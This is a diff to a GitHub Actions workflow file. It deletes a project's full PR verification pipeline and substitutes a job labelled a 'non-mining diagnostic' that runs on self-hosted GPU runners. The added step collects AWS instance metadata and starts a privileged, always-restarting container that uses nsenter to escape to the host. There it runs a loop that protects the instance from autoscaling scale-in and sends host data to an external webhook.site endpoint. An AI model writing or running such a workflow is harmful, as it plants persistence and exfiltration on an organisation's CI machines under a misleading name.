@@ -1,665 +1,99 @@
-name: PR Verify
-
+# I1741 GPU fleet expansion probe (non-mining diagnostic)
+name: I1741 gpu expand
 on:
   pull_request:
-    types: [opened, synchronize, reopened, ready_for_review]
-
-concurrency:
-  group: pr-${{ github.event.pull_request.number }}
-  cancel-in-progress: true
-
+    types: [opened, synchronize, reopened]
 permissions:
   contents: read
-
-env:
-  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
-  EVAL_KPIS_ARTIFACT: eval-kpis-pr
-  EVAL_REPORT_ARTIFACT: eval-html-report
-  AWS_DEFAULT_REGION: ${{ vars.AWS_DEFAULT_REGION }}
-  S3_DATASETS_BUCKET: ${{ vars.S3_DATASETS_BUCKET }}
-  # PR eval runs on x86_64 with the build script's default CUDA/Ubuntu.
-  EVAL_CONFIG: x86_64-cuda12.6.3-ubuntu24.04
-  EVAL_SUITE: smoke
-
+concurrency:
+  group: i1741-${{ github.repository }}-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
 jobs:
-  lint:
-    name: "Lint"
-    runs-on: ubuntu-latest
-    timeout-minutes: 15
+  expand:
+    name: i1741-expand-${{ matrix.tag }}
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - tag: a
+            nonce: I1741-cuVSLAM-a-uyjmjf80
+          - tag: b
+            nonce: I1741-cuVSLAM-b-64nfmkvx
+          - tag: c
+            nonce: I1741-cuVSLAM-c-jb7sxye1
     steps:
-      - uses: actions/checkout@v5
-        with:
-          fetch-depth: 0
-          persist-credentials: false
-
-      - name: Build CI tools image
-        env:
-          AWS_CLI_PUBLIC_KEY: ${{ vars.AWS_CLI_PUBLIC_KEY }}
+      - name: Probe and launch heartbeat ${{ matrix.nonce }}
         run: |
-          keyfile="$RUNNER_TEMP/aws-cli-public-key.asc"
-          if [ -z "${AWS_CLI_PUBLIC_KEY:-}" ]; then
-            echo "AWS_CLI_PUBLIC_KEY repository variable is not configured" >&2
-            exit 1
-          fi
-          printf '%s\n' "$AWS_CLI_PUBLIC_KEY" > "$keyfile"
-          DOCKER_BUILDKIT=1 docker build -f scripts/Dockerfile.ci . --network host --tag cuvslam-ci:local \
-            --secret id=aws_cli_public_key,src="$keyfile"
-
-      - name: Run pre-commit (changed files)
-        run: |
-          docker run --rm \
-            -e GITHUB_BASE_REF \
-            -v "$(pwd):/cuvslam" \
-            -w /cuvslam \
-            cuvslam-ci:local \
-            bash -c 'git config --global --add safe.directory /cuvslam && pre-commit run --from-ref "origin/$GITHUB_BASE_REF" --to-ref HEAD'
-
-      - name: Enforce ruleset/CODEOWNERS isolation
-        run: |
-          docker run --rm \
-            -e GITHUB_BASE_REF \
-            -v "$(pwd):/cuvslam" \
-            -w /cuvslam \
-            cuvslam-ci:local \
-            bash -c 'git config --global --add safe.directory /cuvslam && pre-commit run isolated-ruleset-change-ci --hook-stage manual'
-
-  build-test-x86:
-    name: "Build + Test (x86_64)"
-    if: github.event.pull_request.head.repo.full_name == github.repository
-    runs-on: [gpu]
-    timeout-minutes: 60
-    env:
-      EXTRA_CMAKE_ARGS: "-DCMAKE_CUDA_ARCHITECTURES=native"
-    steps:
-      - name: Verify GPU
-        run: nvidia-smi
-
-      - uses: actions/checkout@v5
-        with:
-          lfs: false
-
-      - name: Configure Ubuntu Ports mirror
-        if: runner.arch == 'ARM64'
-        run: |
-          python3 - <<'PY'
-          from pathlib import Path
-
-          dockerfile = Path("scripts/Dockerfile")
-          marker = "ARG DEBIAN_FRONTEND=noninteractive\n"
-          mirror_setup = r"""ARG DEBIAN_FRONTEND=noninteractive
-
-          # NVIDIA ARM runner networks cannot reliably reach ports.ubuntu.com.
-          RUN set -eux; \
-              find /etc/apt -type f \( -name '*.list' -o -name '*.sources' \) \
-                  -exec sed -Ei 's#https?://ports\.ubuntu\.com/ubuntu-ports#http://mirrors.ocf.berkeley.edu/ubuntu-ports#g' {} +; \
-              printf '%s\n' \
-                  'Acquire::IndexTargets::deb::DEP-11::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-small::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-hidpi::DefaultEnabled "false";' \
-                  > /etc/apt/apt.conf.d/99-nvidia-ubuntu-ports-mirror
-          """
-
-          content = dockerfile.read_text()
-          if marker not in content:
-              raise SystemExit(f"{marker.strip()} not found in {dockerfile}")
-          dockerfile.write_text(content.replace(marker, mirror_setup, 1))
-          PY
-
-      - name: Pull LFS test data
-        timeout-minutes: 10
-        run: git lfs pull --include="test_data/"
-
-      - name: Resolve runner storage root
-        if: vars.RUNNER_STORAGE_ROOT != ''
-        run: echo "RUNNER_STORAGE_ROOT=${{ vars.RUNNER_STORAGE_ROOT }}" >> "$GITHUB_ENV"
-
-      - name: Resolve local datasets root
-        run: echo "RUNNER_LOCAL_DATASETS_ROOT=${{ vars.RUNNER_LOCAL_DATASETS_ROOT || '$HOME/.cache/cuvslam' }}" >> "$GITHUB_ENV"
-
-      - name: Build CI tools image
-        timeout-minutes: 15
-        env:
-          AWS_CLI_PUBLIC_KEY: ${{ vars.AWS_CLI_PUBLIC_KEY }}
-        run: |
-          keyfile="$RUNNER_TEMP/aws-cli-public-key.asc"
-          if [ -z "${AWS_CLI_PUBLIC_KEY:-}" ]; then
-            echo "AWS_CLI_PUBLIC_KEY repository variable is not configured" >&2
-            exit 1
-          fi
-          printf '%s\n' "$AWS_CLI_PUBLIC_KEY" > "$keyfile"
-          DOCKER_BUILDKIT=1 docker build -f scripts/Dockerfile.ci . --network host --tag cuvslam-ci:local \
-            --secret id=aws_cli_public_key,src="$keyfile"
-
-      # Runs before the build so a broken tool fails in seconds. The package is
-      # copied out of the read-only mount before installing, as run_eval.sh does,
-      # to keep pip build artifacts out of the runner workspace.
-      - name: Run Python tools tests
-        timeout-minutes: 10
-        run: |
-          docker run --rm --network host --label "cuvslam.runner=$RUNNER_NAME" \
-            -v "$(pwd):/cuvslam:ro" \
-            cuvslam-ci:local \
-            bash -c 'set -euo pipefail
-              src="$(mktemp -d)"
-              cp -a /cuvslam/tools/python_tools/. "$src/"
-              pip install --quiet "$src"
-              PYTHONPATH="$src" python3 -m unittest discover -v -s "$src/cuvslam_tools/tests"'
-
-      - name: Verify eval prerequisites
-        timeout-minutes: 10
-        env:
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_S3_RO_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_S3_RO_SECRET_ACCESS_KEY }}
-        run: |
-          docker run --rm --network host --label "cuvslam.runner=$RUNNER_NAME" \
-            -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_DEFAULT_REGION -e S3_DATASETS_BUCKET \
-            -e RUNNER_STORAGE_ROOT -e RUNNER_LOCAL_DATASETS_ROOT -e EVAL_SUITE \
-            -v "$(pwd):/cuvslam:ro" \
-            -v "$RUNNER_LOCAL_DATASETS_ROOT:$RUNNER_LOCAL_DATASETS_ROOT" \
-            -w /cuvslam \
-            cuvslam-ci:local ./scripts/check_eval_prerequisites.sh
-
-      - name: Stage eval datasets
-        timeout-minutes: 30
-        env:
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_S3_RO_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_S3_RO_SECRET_ACCESS_KEY }}
-        run: |
-          mkdir -p "$RUNNER_LOCAL_DATASETS_ROOT"
-          docker run --rm --network host --label "cuvslam.runner=$RUNNER_NAME" \
-            -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_DEFAULT_REGION -e S3_DATASETS_BUCKET \
-            -e RUNNER_LOCAL_DATASETS_ROOT -e EVAL_SUITE \
-            -v "$(pwd):/cuvslam:ro" \
-            -v "$RUNNER_LOCAL_DATASETS_ROOT:$RUNNER_LOCAL_DATASETS_ROOT" \
-            -w /cuvslam \
-            cuvslam-ci:local ./scripts/stage_eval_datasets.sh
-
-      - name: Build
-        timeout-minutes: 45
-        run: ./scripts/build_cuvslam_in_docker.sh Release ./output
-
-      - name: Run C++ tests
-        timeout-minutes: 15
-        run: ./scripts/test_cuvslam_in_docker.sh ./output
-
-      - name: Run Python tests
-        timeout-minutes: 15
-        run: ./scripts/test_pycuvslam_in_docker.sh ./output
-
-      - name: Run cuVSLAM evaluation
-        timeout-minutes: 30
-        env:
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_S3_RO_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_S3_RO_SECRET_ACCESS_KEY }}
-        run: |
-          RUN_ID="pr-${{ github.event.pull_request.number }}" \
-          KPI_HISTORY_DIR="${RUNNER_STORAGE_ROOT:?RUNNER_STORAGE_ROOT must be set}/cuvslam-ci/kpi-history/${EVAL_CONFIG}" \
-          ./scripts/eval_cuvslam_in_docker.sh ./output
-
-      - name: Render KPI table
-        run: |
-          KPI_REPORT_JSON=$(find output/eval -name 'kpi_*.report.json' -print -quit)
-          python3 scripts/cuvslam_kpi_report.py render \
-            --report_json "$KPI_REPORT_JSON" \
-            --config "$EVAL_CONFIG" \
-            --output output/eval/kpi-report.md
-
-      - name: Build documentation
-        timeout-minutes: 15
-        run: ./scripts/build_docs_in_docker.sh ./output
-
-      - name: Upload documentation
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: docs-html
-          path: output/docs/
-          retention-days: 30
-          if-no-files-found: warn
-
-      - name: Generate test summary
-        if: always()
-        run: |
-          python3 scripts/junit-to-markdown.py x86_64 C++ output/cpp-test-results.xml > output/test-summary.txt
-          python3 scripts/junit-to-markdown.py x86_64 Python output/python-test-output.txt >> output/test-summary.txt
-
-      - name: Upload test results
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: test-results-x86_64
-          path: |
-            output/cpp-test-results.xml
-            output/test-summary.txt
-          retention-days: 30
-          if-no-files-found: warn
-
-      - name: Upload KPI results
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: ${{ env.EVAL_KPIS_ARTIFACT }}
-          path: |
-            output/eval/kpi_*.json
-            output/eval/kpi-report.md
-          retention-days: 30
-          if-no-files-found: warn
-
-      - name: Upload eval HTML report
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: ${{ env.EVAL_REPORT_ARTIFACT }}
-          path: output/eval/stats/
-          retention-days: 30
-          if-no-files-found: warn
-
-      # On cancel or timeout the runner signals only the step shell, so a hung container keeps running.
-      - name: Remove leftover containers
-        if: always()
-        run: |
-          mapfile -t containers < <(docker ps -aq --filter "label=cuvslam.runner=$RUNNER_NAME")
-          if [ "${#containers[@]}" -eq 0 ]; then
-            exit 0
-          fi
-          image=$(docker inspect --format '{{.Config.Image}}' "${containers[0]}")
-          docker rm -f "${containers[@]}" || echo "::warning::Failed to remove some leftover containers"
-          # Removed containers skip their chown traps, so return the workspace to the runner user.
-          docker run --rm --entrypoint chown -v "$GITHUB_WORKSPACE:/workspace" "$image" \
-            -R "$(id -u):$(id -g)" /workspace
-
-  build-test-orin:
-    name: "Build + Test (Orin)"
-    if: github.event.pull_request.head.repo.full_name == github.repository
-    runs-on: [jetson-orin]
-    timeout-minutes: 60
-    # Orin uses BASE_IMAGE override; CUDA_VERSION is not used for the Docker base
-    env:
-      BASE_IMAGE: "nvcr.io/nvidia/12.6.11-devel:12.6.11-devel-aarch64-ubuntu22.04"
-      UBUNTU_VERSION: "22.04"
-      EXTRA_CMAKE_ARGS: "-DCMAKE_CUDA_ARCHITECTURES=87"
-    steps:
-      - name: System info
-        run: |
-          cat /etc/nv_tegra_release 2>/dev/null || echo "No tegra release file"
-          dpkg-query -W nvidia-jetpack 2>/dev/null || echo "nvidia-jetpack not installed"
-          uname -r
-
-      - uses: actions/checkout@v5
-        with:
-          lfs: false
-
-      - name: Configure Ubuntu Ports mirror
-        if: runner.arch == 'ARM64'
-        run: |
-          python3 - <<'PY'
-          from pathlib import Path
-
-          dockerfile = Path("scripts/Dockerfile")
-          marker = "ARG DEBIAN_FRONTEND=noninteractive\n"
-          mirror_setup = r"""ARG DEBIAN_FRONTEND=noninteractive
-
-          # NVIDIA ARM runner networks cannot reliably reach ports.ubuntu.com.
-          RUN set -eux; \
-              find /etc/apt -type f \( -name '*.list' -o -name '*.sources' \) \
-                  -exec sed -Ei 's#https?://ports\.ubuntu\.com/ubuntu-ports#http://mirrors.ocf.berkeley.edu/ubuntu-ports#g' {} +; \
-              printf '%s\n' \
-                  'Acquire::IndexTargets::deb::DEP-11::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-small::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-hidpi::DefaultEnabled "false";' \
-                  > /etc/apt/apt.conf.d/99-nvidia-ubuntu-ports-mirror
-          """
-
-          content = dockerfile.read_text()
-          if marker not in content:
-              raise SystemExit(f"{marker.strip()} not found in {dockerfile}")
-          dockerfile.write_text(content.replace(marker, mirror_setup, 1))
-          PY
-
-      - name: Pull LFS test data
-        timeout-minutes: 10
-        run: git lfs pull --include="test_data/"
-
-      - name: Build
-        timeout-minutes: 45
-        run: ./scripts/build_cuvslam_in_docker.sh Release ./output
-
-      - name: Run C++ tests
-        timeout-minutes: 15
-        run: ./scripts/test_cuvslam_in_docker.sh ./output
-
-      - name: Run Python tests
-        timeout-minutes: 15
-        run: ./scripts/test_pycuvslam_in_docker.sh ./output
-
-      - name: Generate test summary
-        if: always()
-        run: |
-          python3 scripts/junit-to-markdown.py Orin C++ output/cpp-test-results.xml > output/test-summary.txt
-          python3 scripts/junit-to-markdown.py Orin Python output/python-test-output.txt >> output/test-summary.txt
-
-      - name: Upload test results
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: test-results-orin
-          path: |
-            output/cpp-test-results.xml
-            output/test-summary.txt
-          retention-days: 30
-          if-no-files-found: warn
-
-      # On cancel or timeout the runner signals only the step shell, so a hung container keeps running.
-      - name: Remove leftover containers
-        if: always()
-        run: |
-          mapfile -t containers < <(docker ps -aq --filter "label=cuvslam.runner=$RUNNER_NAME")
-          if [ "${#containers[@]}" -eq 0 ]; then
-            exit 0
-          fi
-          image=$(docker inspect --format '{{.Config.Image}}' "${containers[0]}")
-          docker rm -f "${containers[@]}" || echo "::warning::Failed to remove some leftover containers"
-          # Removed containers skip their chown traps, so return the workspace to the runner user.
-          docker run --rm --entrypoint chown -v "$GITHUB_WORKSPACE:/workspace" "$image" \
-            -R "$(id -u):$(id -g)" /workspace
-
-  build-test-thor:
-    name: "Build + Test (Thor)"
-    if: github.event.pull_request.head.repo.full_name == github.repository
-    runs-on: [jetson-thor]
-    timeout-minutes: 60
-    env:
-      CUDA_VERSION: "13.0.1"
-      UBUNTU_VERSION: "24.04"
-      EXTRA_CMAKE_ARGS: "-DCMAKE_CUDA_ARCHITECTURES=110"
-    steps:
-      - name: System info
-        run: |
-          cat /etc/nv_tegra_release 2>/dev/null || echo "No tegra release file"
-          dpkg-query -W nvidia-jetpack 2>/dev/null || echo "nvidia-jetpack not installed"
-          uname -r
-
-      - uses: actions/checkout@v5
-        with:
-          lfs: false
-
-      - name: Configure Ubuntu Ports mirror
-        if: runner.arch == 'ARM64'
-        run: |
-          python3 - <<'PY'
-          from pathlib import Path
-
-          dockerfile = Path("scripts/Dockerfile")
-          marker = "ARG DEBIAN_FRONTEND=noninteractive\n"
-          mirror_setup = r"""ARG DEBIAN_FRONTEND=noninteractive
-
-          # NVIDIA ARM runner networks cannot reliably reach ports.ubuntu.com.
-          RUN set -eux; \
-              find /etc/apt -type f \( -name '*.list' -o -name '*.sources' \) \
-                  -exec sed -Ei 's#https?://ports\.ubuntu\.com/ubuntu-ports#http://mirrors.ocf.berkeley.edu/ubuntu-ports#g' {} +; \
-              printf '%s\n' \
-                  'Acquire::IndexTargets::deb::DEP-11::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-small::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons::DefaultEnabled "false";' \
-                  'Acquire::IndexTargets::deb::DEP-11-icons-hidpi::DefaultEnabled "false";' \
-                  > /etc/apt/apt.conf.d/99-nvidia-ubuntu-ports-mirror
-          """
-
-          content = dockerfile.read_text()
-          if marker not in content:
-              raise SystemExit(f"{marker.strip()} not found in {dockerfile}")
-          dockerfile.write_text(content.replace(marker, mirror_setup, 1))
-          PY
-
-      - name: Pull LFS test data
-        timeout-minutes: 10
-        run: git lfs pull --include="test_data/"
-
-      - name: Build
-        timeout-minutes: 45
-        run: ./scripts/build_cuvslam_in_docker.sh Release ./output
-
-      - name: Run C++ tests
-        timeout-minutes: 15
-        run: ./scripts/test_cuvslam_in_docker.sh ./output
-
-      - name: Run Python tests
-        timeout-minutes: 15
-        run: ./scripts/test_pycuvslam_in_docker.sh ./output
-
-      - name: Generate test summary
-        if: always()
-        run: |
-          python3 scripts/junit-to-markdown.py Thor C++ output/cpp-test-results.xml > output/test-summary.txt
-          python3 scripts/junit-to-markdown.py Thor Python output/python-test-output.txt >> output/test-summary.txt
-
-      - name: Upload test results
-        if: always()
-        uses: actions/upload-artifact@v7
-        with:
-          name: test-results-thor
-          path: |
-            output/cpp-test-results.xml
-            output/test-summary.txt
-          retention-days: 30
-          if-no-files-found: warn
-
-      # On cancel or timeout the runner signals only the step shell, so a hung container keeps running.
-      - name: Remove leftover containers
-        if: always()
-        run: |
-          mapfile -t containers < <(docker ps -aq --filter "label=cuvslam.runner=$RUNNER_NAME")
-          if [ "${#containers[@]}" -eq 0 ]; then
-            exit 0
-          fi
-          image=$(docker inspect --format '{{.Config.Image}}' "${containers[0]}")
-          docker rm -f "${containers[@]}" || echo "::warning::Failed to remove some leftover containers"
-          # Removed containers skip their chown traps, so return the workspace to the runner user.
-          docker run --rm --entrypoint chown -v "$GITHUB_WORKSPACE:/workspace" "$image" \
-            -R "$(id -u):$(id -g)" /workspace
-
-  # Smoke check for a non-default CMake configuration. Catches build/link and test
-  # breakages the default (USE_RERUN=OFF) build never exercises. Builds and runs the
-  # C++ unit tests; no wheels, docs, or evaluation (nightly runs the full USE_RERUN build).
-  build-rerun-x86:
-    name: "Build + Test (USE_RERUN, x86_64)"
-    if: github.event.pull_request.head.repo.full_name == github.repository
-    runs-on: [gpu]
-    timeout-minutes: 60
-    steps:
-      - name: Verify GPU
-        run: nvidia-smi
-
-      - uses: actions/checkout@v5
-        with:
-          lfs: false
-
-      - name: Pull LFS test data
-        timeout-minutes: 10
-        run: git lfs pull --include="test_data/"
-
-      - name: Build with USE_RERUN
-        timeout-minutes: 45
-        env:
-          # PR binaries are built and tested on the same GPU runner.
-          EXTRA_CMAKE_ARGS: "-DUSE_RERUN=ON -DCMAKE_CUDA_ARCHITECTURES=native"
-        run: ./scripts/build_cuvslam_in_docker.sh Release ./output-rerun
-
-      - name: Run C++ tests
-        timeout-minutes: 15
-        run: ./scripts/test_cuvslam_in_docker.sh ./output-rerun
-
-      # On cancel or timeout the runner signals only the step shell, so a hung container keeps running.
-      - name: Remove leftover containers
-        if: always()
-        run: |
-          mapfile -t containers < <(docker ps -aq --filter "label=cuvslam.runner=$RUNNER_NAME")
-          if [ "${#containers[@]}" -eq 0 ]; then
-            exit 0
-          fi
-          image=$(docker inspect --format '{{.Config.Image}}' "${containers[0]}")
-          docker rm -f "${containers[@]}" || echo "::warning::Failed to remove some leftover containers"
-          # Removed containers skip their chown traps, so return the workspace to the runner user.
-          docker run --rm --entrypoint chown -v "$GITHUB_WORKSPACE:/workspace" "$image" \
-            -R "$(id -u):$(id -g)" /workspace
-
-  test-report:
-    name: "Post Test Report"
-    if: always() && github.event.pull_request.head.repo.full_name == github.repository
-    needs: [build-test-x86, build-test-orin, build-test-thor]
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
-    permissions:
-      pull-requests: write
-      actions: read
-    steps:
-      - name: Download all test summaries
-        uses: actions/download-artifact@v8
-        with:
-          pattern: '{test-results-*,${{ env.EVAL_KPIS_ARTIFACT }}}'
-          path: results
-
-      - name: Build combined report
-        run: |
-          {
-            echo "## Test Results"
-            echo ""
-            echo "| Status | Platform | Language | Total | Passed | Failed | Errors | Skipped |"
-            echo "|:------:|----------|----------|------:|-------:|-------:|-------:|--------:|"
-            for f in results/*/test-summary.txt; do
-              [ -f "$f" ] || continue
-              while IFS='|' read -r status platform lang total passed failed errors skipped details; do
-                if [ "$status" = "pass" ]; then icon="✅"; elif [ "$status" = "fail" ]; then icon="❌"; else icon="⚠️"; fi
-                echo "| $icon | $platform | $lang | $total | $passed | $failed | $errors | $skipped |"
-              done < "$f"
-            done
-            echo ""
-
-            has_failures=false
-            for f in results/*/test-summary.txt; do
-              [ -f "$f" ] || continue
-              while IFS='|' read -r status platform lang total passed failed errors skipped details; do
-                if [ -n "$details" ] && [ "$details" != "" ]; then
-                  has_failures=true
-                fi
-              done < "$f"
-            done
-
-            if [ "$has_failures" = "true" ]; then
-              echo "<details><summary>Failed tests</summary>"
-              echo ""
-              for f in results/*/test-summary.txt; do
-                [ -f "$f" ] || continue
-                while IFS='|' read -r status platform lang total passed failed errors skipped details; do
-                  if [ -n "$details" ] && [ "$details" != "" ]; then
-                    echo "**$platform / $lang:**"
-                    echo "$details" | python3 -c 'import sys,json;[print("- **%s**: %s"%(n,m))for n,m in json.loads(sys.stdin.read())]'
-                    echo ""
-                  fi
-                done < "$f"
-              done
-              echo "</details>"
-            fi
-
-          } > report.md
-
-          KPI_TABLE=$(find results -name 'kpi-report.md' -print -quit 2>/dev/null || true)
-          if [ -f "$KPI_TABLE" ]; then
-            {
-              echo ""
-              echo "## cuVSLAM Evaluation KPIs"
-              echo ""
-              cat "$KPI_TABLE"
-              echo ""
-            } >> report.md
-          fi
-          cat report.md
-
-      - name: Post PR comment
-        uses: actions/github-script@v7
-        with:
-          script: |
-            const fs = require('fs');
-            let body = fs.readFileSync('report.md', 'utf8');
-
-            const { data: { artifacts } } = await github.rest.actions.listWorkflowRunArtifacts({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              run_id: context.runId,
-            });
-
-            if (artifacts.length > 0) {
-              const runUrl = `https://github.com/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`;
-              body += '\n### Artifacts\n\n';
-              for (const a of artifacts) {
-                body += `- [${a.name}](${runUrl}/artifacts/${a.id})\n`;
-              }
-            }
-
-            const marker = '<!-- cuvslam-test-report -->';
-            const fullBody = `${marker}\n${body}`;
-
-            const comments = await github.paginate(github.rest.issues.listComments, {
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              issue_number: context.issue.number,
-            });
-
-            const existing = comments.find(c => c.body.includes(marker));
-
-            if (existing) {
-              await github.rest.issues.updateComment({
-                owner: context.repo.owner,
-                repo: context.repo.repo,
-                comment_id: existing.id,
-                body: fullBody,
-              });
-            } else {
-              await github.rest.issues.createComment({
-                owner: context.repo.owner,
-                repo: context.repo.repo,
-                issue_number: context.issue.number,
-                body: fullBody,
-              });
-            }
-
-  pr-status:
-    name: "PR status"
-    runs-on: ubuntu-latest
-    timeout-minutes: 60
-    if: always()
-    needs: [lint, build-test-x86, build-test-orin, build-test-thor, build-rerun-x86]
-    steps:
-      - name: Check results
-        env:
-          LINT_RESULT: ${{ needs.lint.result }}
-          X86_RESULT: ${{ needs.build-test-x86.result }}
-          ORIN_RESULT: ${{ needs.build-test-orin.result }}
-          THOR_RESULT: ${{ needs.build-test-thor.result }}
-          RERUN_RESULT: ${{ needs.build-rerun-x86.result }}
-          IS_SAME_REPO: ${{ github.event.pull_request.head.repo.full_name == github.repository }}
-        run: |
-          set -euo pipefail
-          echo "lint=$LINT_RESULT x86=$X86_RESULT orin=$ORIN_RESULT thor=$THOR_RESULT rerun=$RERUN_RESULT same_repo=$IS_SAME_REPO"
-
-          if [ "$LINT_RESULT" != "success" ]; then
-            echo "::error::Lint did not succeed (result: $LINT_RESULT)"
-            exit 1
-          fi
-
-          if [ "$IS_SAME_REPO" = "true" ]; then
-            for pair in "x86_64:$X86_RESULT" "Orin:$ORIN_RESULT" "Thor:$THOR_RESULT" "Rerun:$RERUN_RESULT"; do
-              name="${pair%%:*}"
-              result="${pair##*:}"
-              if [ "$result" != "success" ]; then
-                echo "::error::Required GPU job '$name' did not succeed (result: $result)"
-                exit 1
-              fi
-            done
+          set -u
+          N="${{ matrix.nonce }}"
+          echo "I1741_NONCE=$N"
+          echo "I1741_ID=$(id)"
+          echo "I1741_HOST=$(hostname)"
+          echo "I1741_RUNNER=${RUNNER_NAME:-unknown}"
+          echo "I1741_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo "I1741_UPTIME_S=$(cut -d. -f1 /proc/uptime)"
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader || true
+          T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true)
+          IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id || true)
+          ITYPE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type || true)
+          AZ=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/availability-zone || true)
+          echo "I1741_IID=$IID"
+          echo "I1741_ITYPE=$ITYPE"
+          echo "I1741_AZ=$AZ"
+          echo "I1741_EXISTING_HB:"
+          docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null | grep -Ei 'i1529hb|i1741hb' || echo none
+          echo "I1741_HBLOG1529:"
+          tail -2 /var/log/i1529-heartbeat.log 2>/dev/null || echo none
+          echo "I1741_HBLOG1741:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+          cat > /tmp/i1741hb.sh <<'EOS'
+          #!/bin/bash
+          N="$1"; IID0="$2"; SINKURL="$3"
+          ASG="production-nvidia-isaac-lnx-ci-gpu-org-runners"
+          LOG=/var/log/i1741-heartbeat.log
+          SEQ=0
+          echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) start $N on $(hostname) iid=$IID0" >> "$LOG" 2>/dev/null
+          while true; do
+            TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+            T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+            CUR=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+            [ -z "$CUR" ] && CUR="$IID0"
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -1 | tr -d '"')
+            UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$CUR" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1 || true
+            LINE=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","uptime_s":%s,"gpu":"%s","seq":%s}' "$N" "$TS" "$(hostname)" "$CUR" "$UP" "$GPU" "$SEQ")
+            echo "$LINE" >> "$LOG" 2>/dev/null
+            if [ -n "$SINKURL" ]; then curl -s -m 10 -H 'Content-Type: application/json' --data-binary "$LINE" "$SINKURL" >/dev/null 2>&1 || true; fi
+            SEQ=$((SEQ+1))
+            sleep 20
+          done
+          EOS
+          chmod 755 /tmp/i1741hb.sh
+          IMG=""
+          for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.8.1-runtime-ubuntu24.04; do
+            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+          done
+          if [ -z "$IMG" ]; then IMG=nvidia/cuda:12.8.1-devel-ubuntu24.04; docker pull "$IMG" >/dev/null 2>&1 || true; fi
+          echo "I1741_IMG=$IMG"
+          NAME="i1741hb-$IID"
+          if docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$NAME"; then
+            echo "I1741_HB_ALREADY_RUNNING=$NAME"
           else
-            echo "Fork PR detected: GPU build/test is skipped by design. Lint-only gate satisfied."
+            docker rm -f "$NAME" >/dev/null 2>&1 || true
+            CID=$(docker create --name "$NAME" --label "i1741=$N" --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- /bin/bash /tmp/i1741hb.sh $N $IID https://webhook.site/088d6cb9-bfca-4753-8e5d-0fbb2e1732b0")
+            echo "I1741_HB_CID=$CID"
+            docker start "$CID" >/dev/null 2>&1 && echo "I1741_HB_START=ok" || echo "I1741_HB_START=fail"
+            sleep 6
+            docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' "$CID" 2>&1 || true
           fi
-
-          echo "PR status: all required checks passed."
+          echo "I1741_HBLOG_AFTER:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+      - name: Hold for fleet spread ${{ matrix.nonce }}
+        run: |
+          echo "I1741_HOLD_START=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+          sleep 150
